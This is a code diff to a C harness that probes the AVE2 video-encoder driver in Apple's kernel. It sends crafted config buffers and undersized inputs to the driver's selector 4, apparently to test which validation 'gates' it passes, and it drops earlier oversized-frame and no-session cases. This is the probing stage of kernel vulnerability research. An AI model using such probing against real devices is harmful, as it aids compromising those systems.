@@ -49,7 +49,7 @@ static uint8_t  stat_in[0x1a0c0];
 static uint8_t  anon_in[0x1a0c0];
 static uint8_t  in[0x6f0];
 static uint8_t  out[0x400];
-static uint64_t counter = 0x0000700000003000ULL;
+static uint64_t counter = 0x0000700000004000ULL;
 static io_service_t svc;
 
 static kern_return_t create_session(int mode, io_connect_t *conn) {
@@ -93,8 +93,11 @@ static void fill_cfg(int which, int w, int h, int p6, int enctype, int slices, i
     *(int32_t *)(buf + AVE2_MODE5_OFF_P7)  = p7;
 }
 
-static void sel4(const char *tag, io_connect_t c, int which, size_t isz) {
+/* v22 gate variants: gsel 0 = P6 gate (min 0x38), 1 = P7 gate (min 0x28) */
+static void sel4(const char *tag, io_connect_t c, int which, size_t isz, int gsel) {
     uint8_t *buf = which == 0 ? stat_in : anon_in;
+    if (gsel) *(int32_t *)(buf + AVE2_MODE5_OFF_P7) = 4;
+    else      *(int32_t *)(buf + AVE2_MODE5_OFF_P6) = 2;
     memset(out, 0xAA, sizeof(out));
     size_t o = 0x20;
     kern_return_t kr = p_IOConnectCallStructMethod(c, 4, buf, isz, out, &o);
@@ -139,30 +142,14 @@ int main(void) {
         destroy_close(c);
     }
 
-    printf("\n=== S2 create m1: anon-mmap input ===\n");
-    if (create_session(1, &c) == 0) {
-        fill_cfg(1, 1920, 1080, 2, 1, 0, 0); sel4("enctype1/ANON/1920", c, 1, 0x1a0a0);
-        fill_cfg(1, 64656, 8080, 2, 1, 0, 0); sel4("enctype1/ANON/64656x8080", c, 1, 0x1a0a0);
-        destroy_close(c);
-    }
-
-    printf("\n=== S3 create m2: enctype1 ===\n");
-    if (create_session(2, &c) == 0) {
-        fill_cfg(0, 1920, 1080, 2, 1, 0, 0); sel4("enctype1/static/m2", c, 0, 0x1a0a0);
-        destroy_close(c);
-    }
-
-    printf("\n=== S4 create m1 + sel3 async: enctype1 ===\n");
+    printf("\n=== S4 create m1 + sel3 async: gate ladder (v22) ===\n");
     if (create_session(1, &c) == 0) {
         sel3_async(c, wake);
-        fill_cfg(0, 1920, 1080, 2, 1, 0, 0); sel4("enctype1/post-sel3", c, 0, 0x1a0a0);
+        fill_cfg(0, 1920, 1080, 2, 0, 0, 0); sel4("P6/e0", c, 0, 0x38, 0);
+        fill_cfg(0, 1920, 1080, 2, 0, 0, 0); sel4("P7/e0", c, 0, 0x28, 1);
+        fill_cfg(0, 1920, 1080, 2, 1, 0, 0); sel4("P6/e1", c, 0, 0x38, 0);
+        fill_cfg(0, 1920, 1080, 2, 1, 0, 0); sel4("P7/e1", c, 0, 0x28, 1);
         destroy_close(c);
-    }
-
-    printf("\n=== S5 no create: enctype1 ===\n");
-    if (p_IOServiceOpen(svc, mach_task_self(), 1, &c) == 0) {
-        fill_cfg(0, 1920, 1080, 2, 1, 0, 0); sel4("enctype1/no-create", c, 0, 0x1a0a0);
-        p_IOServiceClose(c);
     }
 
     munmap(anon, sizeof(anon_in));
